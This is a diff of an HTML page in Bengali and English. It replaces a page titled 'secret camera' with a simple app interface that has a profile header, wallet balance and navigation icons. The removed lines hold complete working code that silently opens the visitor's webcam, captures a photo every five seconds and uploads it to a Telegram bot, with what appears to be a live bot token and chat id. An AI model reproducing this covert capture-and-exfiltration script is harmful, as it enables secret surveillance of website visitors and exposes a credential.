@@ -3,81 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>গোপন ক্যামেরা</title>
-    <style>
-        body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-            background-color: #f0f8ff;
-            padding: 20px;
-        }
-        h1 {
-            color: #008080;
-        }
-    </style>
+    <title>Custom UI</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <header>
+        <div class="profile">
+            <img src="profile.jpg" alt="Profile">
+            <span>Nahid</span>
+        </div>
+        <div class="balance">0.00৳</div>
+    </header>
 
-    <h1>গোপন ক্যামেরা চলছে...</h1>
-    
-    <video id="video" autoplay playsinline style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <main>
+        <div class="message">হ্যালো আসসালামু আলাইকুম গাইস</div>
+        <a href="help.html" class="help-btn">
+            <img src="help-icon.png" alt="Help">
+        </a>
+    </main>
 
-    <script>
-        let video = document.getElementById("video");
-        let canvas = document.getElementById("canvas");
-        let context = canvas.getContext("2d");
-
-        // ক্যামেরা চালু করা
-        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
-            .then(function(stream) {
-                video.srcObject = stream;
-            })
-            .catch(function(error) {
-                alert("ক্যামেরা চালু করতে সমস্যা হয়েছে: " + error);
-            });
-
-        // নির্দিষ্ট সময় পরপর ছবি তুলবে এবং টেলিগ্রামে পাঠাবে
-        function captureAndSend() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            let imageData = canvas.toDataURL("image/png"); // ছবির ডাটা
-
-            let botToken = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec"; // 🔴 এখানে তোমার বট টোকেন বসাও
-            let chatId = "7294674899"; // 🔴 এখানে তোমার টেলিগ্রাম চ্যাট আইডি বসাও
-
-            let formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", dataURItoBlob(imageData));
-            formData.append("caption", "একজন ইউজার ওয়েবসাইটে আছে, ছবি উঠেছে!");
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => console.log("✅ ছবি টেলিগ্রামে পাঠানো হয়েছে!"))
-            .catch(error => console.error("❌ ছবি পাঠাতে সমস্যা হয়েছে: " + error));
-        }
-
-        // Base64 ডাটা → Blob ফরম্যাটে কনভার্ট করা
-        function dataURItoBlob(dataURI) {
-            let byteString = atob(dataURI.split(',')[1]);
-            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            let arrayBuffer = new ArrayBuffer(byteString.length);
-            let uint8Array = new Uint8Array(arrayBuffer);
-            
-            for (let i = 0; i < byteString.length; i++) {
-                uint8Array[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([arrayBuffer], { type: mimeString });
-        }
-
-        // প্রতিবার ৫ সেকেন্ড পরপর ছবি তুলবে
-        setInterval(captureAndSend, 5000);
-
-    </script>
+    <footer>
+        <a href="home.html" class="icon-btn"><img src="home-icon.png" alt="Home"></a>
+        <a href="job.html" class="icon-btn"><img src="job-icon.png" alt="Job"></a>
+        <a href="community.html" class="icon-btn"><img src="community-icon.png" alt="Community"></a>
+        <a href="wallet.html" class="icon-btn"><img src="wallet-icon.png" alt="Wallet"></a>
+    </footer>
 
 </body>
 </html>
